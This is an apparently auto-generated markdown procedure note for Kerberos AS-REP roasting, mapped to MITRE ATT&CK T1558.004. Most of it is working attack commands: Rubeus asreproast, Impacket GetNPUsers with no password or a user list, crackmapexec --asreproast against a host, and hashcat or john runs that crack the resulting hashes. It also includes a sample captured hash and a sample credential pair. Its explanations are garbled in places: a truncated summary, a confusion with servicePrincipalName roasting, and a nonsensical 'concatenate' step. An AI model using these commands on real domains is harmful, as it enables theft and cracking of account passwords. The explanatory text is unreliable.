---
id: 0fa459bd-6a52-42d1-b572-c4ca195c40dc
name: Kerberos AS-REP Roasting Attack
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:04.999458+00:00'
updated_at: '2023-04-10T20:26:39.194075+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
techniques:
- '[[Steal or Forge Kerberos Tickets|T1558 - Steal or Forge Kerberos Tickets]]'
sub_techniques:
- '[[AS-REP Roasting|T1558.004 - AS-REP Roasting]]'
tags:
- '[[Active Directory Attacks]]'
- '[[KRB_AS_REP Roasting]]'
commands:
- '[[AS-REP roasting]]'
- '[[Crack AS_REP messages with hashcat]]'
- '[[Crack AS_REP messages with john]]'
- '[[crackmapexec ldap]]'
- '[[Extract hashes]]'
- '[[Get TGT for svc-alfresco]]'
- '[[Hashcat installation]]'
- '[[john]]'
---

# Kerberos AS-REP Roasting Attack

## Summary

The Kerberos AS-REP Roasting Attack is a technique used to extract Kerberos tickets and crack the passwords of user accounts with servicePrincipalName set. This attack can be conducted by requesting an AS-REP message for a user account with a servicePrincipalName set, and then cracking the resultin

## Description

# Description

The Kerberos AS-REP Roasting Attack is a technique used to extract Kerberos tickets and crack the passwords of user accounts with servicePrincipalName set. This attack can be conducted by requesting an AS-REP message for a user account with a servicePrincipalName set, and then cracking the resulting hash offline with tools like Hashcat or John the Ripper. This attack can be used to gain access to sensitive information or systems within an organization.

## Requirements

1. Access to a domain-joined Windows machine

1. Authenticated access to the domain controller

1. Tools like GetNPUsers, Hashcat or John the Ripper

## Defense

1. Enforce strong password policies and periodically change passwords

1. Monitor for unusual Kerberos traffic

1. Disable servicePrincipalName for user accounts that do not require it

## Objectives

1. Extract Kerberos tickets for user accounts with servicePrincipalName set

1. Crack the passwords of user accounts with servicePrincipalName set

# Instructions

1. The 'asreproast' command in Rubeus is used to perform AS-REP roasting attacks. This command requires the '/user' argument to specify the target user account. The '/format' argument can be used to specify the output format of the hash. The '/outfile' argument is used to specify the file name to save the hash to.

**Code**: [[C:\Rubeus>Rubeus.exe asreproast /user:TestOU3user ]]

> AS-REP roasting is a technique used to extract Kerberos authentication credentials from Active Directory domain user accounts that do not require pre-authentication. The attack involves requesting an AS-REP message from the domain controller for a specific user account without providing any pre-authentication data. The resulting AS-REP message contains the user's Kerberos hash that can be cracked offline using tools like Hashcat to obtain the user's plaintext password.

**Command** ([[AS-REP roasting]]):

```bash
Rubeus.exe asreproast /user:TestOU3user /format:hashcat /outfile:hashes.asreproast
```

2. The `GetNPUsers` command is a part of the Impacket Suite that can be used to extract password hashes from a domain controller without requiring any authentication credentials. The command can be used for AS-REP Roasting attack against Kerberos authentication. The command takes multiple arguments such as domain name, username, and password. The command also supports output formats like hashcat, john, and JTR.

**Code**: [[$ python GetNPUsers.py htb.local/svc-alfresco -no-]]

> The `GetNPUsers` command is used to extract password hashes from a domain controller without requiring any authentication credentials. This command can be used for AS-REP Roasting attack against Kerberos authentication. The command requires the domain name and the user account name to be specified as arguments. Additionally, it also supports output formats like hashcat, john, and JTR. The `-no-pass` flag is used to indicate that no password is required for authentication. The `-usersfile` flag is used to specify a file containing a list of usernames to be roasted. The `-request` flag is used to indicate that a TGT should be requested for the specified user account. The `-format` flag is used to specify the output format of the hashes. The `-outputfile` flag is used to specify the output file name.

**Command** ([[Get TGT for svc-alfresco]]):

```bash
$ python GetNPUsers.py htb.local/svc-alfresco -no-pass
$krb5asrep$23$svc-alfresco@HTB.LOCAL:c13528009a59be0a634bb9b8e84c88ee$cb8e87d02bd0ac7a[...]e776b4

```

**Command** ([[Extract hashes]]):

```bash
root@kali:impacket-examples$ python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
root@kali:impacket-examples$ python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```

3. To use this module, run the following command:

**Code**: [[$ crackmapexec ldap 10.0.2.11 -u 'username' -p 'pa]]

> This command cracks the password of a specified user account in the LDAP directory of a target machine. The -u flag specifies the username and -p flag specifies the password. The --kdcHost flag specifies the domain controller to use for the Kerberos authentication. The --asreproast flag specifies that the AS-REP Roasting attack should be used to obtain the encrypted password hash. The output of the command is stored in the output.txt file. The command can be run using the CrackMapExec module in PowerShell.

**Command** ([[crackmapexec ldap]]):

```bash
$ crackmapexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --asreproast output.txt
```

4. To crack passwords using hashcat, you can use the following commands:

1. hashcat -m <hash-type> <hash-file> <wordlist> - This command will attempt to crack the passwords stored in the hash-file using the wordlist provided.

2. hashcat -m <hash-type> <hash-file> <dictionary> - This command will attempt to crack the passwords stored in the hash-file using the dictionary provided.

3. hashcat -m <hash-type> <hash-file> -a 3 <mask> - This command will attempt to brute-force the passwords stored in the hash-file using the mask provided.

**Code**: [[hashcat]]

> The hashcat tool is used for password cracking. It supports a variety of hash types and can be used to crack passwords using brute-force or dictionary attacks. The -m option specifies the hash type, and the <hash-file> argument specifies the file containing the password hashes that you want to crack. The <wordlist> argument specifies the file containing the list of words that hashcat will use to attempt to crack the passwords. The <dictionary> argument specifies the file containing the dictionary that hashcat will use to attempt to crack the passwords. The -a option specifies the attack mode, and the <mask> argument specifies the mask that hashcat will use to attempt to crack the passwords.

**Command** ([[Hashcat installation]]):

```bash
sudo apt-get install hashcat
```

5. Use the concatenate command to combine two or more strings into a single string.

**Code**: [[john]]

> The 'or' in this example is used to separate two strings that will be concatenated. The resulting string will be 'john or'.

**Command** ([[john]]):

```bash
john
```

6. To crack AS_REP messages using hashcat, run the following command:

On Linux:
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt

On Windows:
hashcat64.exe -m 18200 '<AS_REP-hash>' -a 0 c:\wordlists\rockyou.txt

To crack AS_REP messages using john, run the following command:

john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast

**Code**: [[# crack AS_REP messages with hashcat
root@kali:imp]]

> This command provides instructions on how to crack AS_REP messages using two popular tools, hashcat and john. The user can choose to use either tool based on their preference. The command provides separate instructions for Linux and Windows operating systems. The user is required to provide the necessary input files for the command to work. The command also explains the arguments used in the command in detail.

**Command** ([[Crack AS_REP messages with hashcat]]):

```bash
root@kali:impacket-examples$ hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
root@windows:hashcat$ hashcat64.exe -m 18200 '<AS_REP-hash>' -a 0 c:\wordlists\rockyou.txt
```

**Command** ([[Crack AS_REP messages with john]]):

```bash
C:\Rubeus> john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
```

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]

### Techniques

- [[Steal or Forge Kerberos Tickets|T1558 - Steal or Forge Kerberos Tickets]]

### Sub-Techniques

- [[AS-REP Roasting|T1558.004 - AS-REP Roasting]]

## Commands Used

- [[AS-REP roasting]]
- [[Crack AS_REP messages with hashcat]]
- [[Crack AS_REP messages with john]]
- [[crackmapexec ldap]]
- [[Extract hashes]]
- [[Get TGT for svc-alfresco]]
- [[Hashcat installation]]
- [[john]]

## Tags

- [[Active Directory Attacks]]
- [[KRB_AS_REP Roasting]]
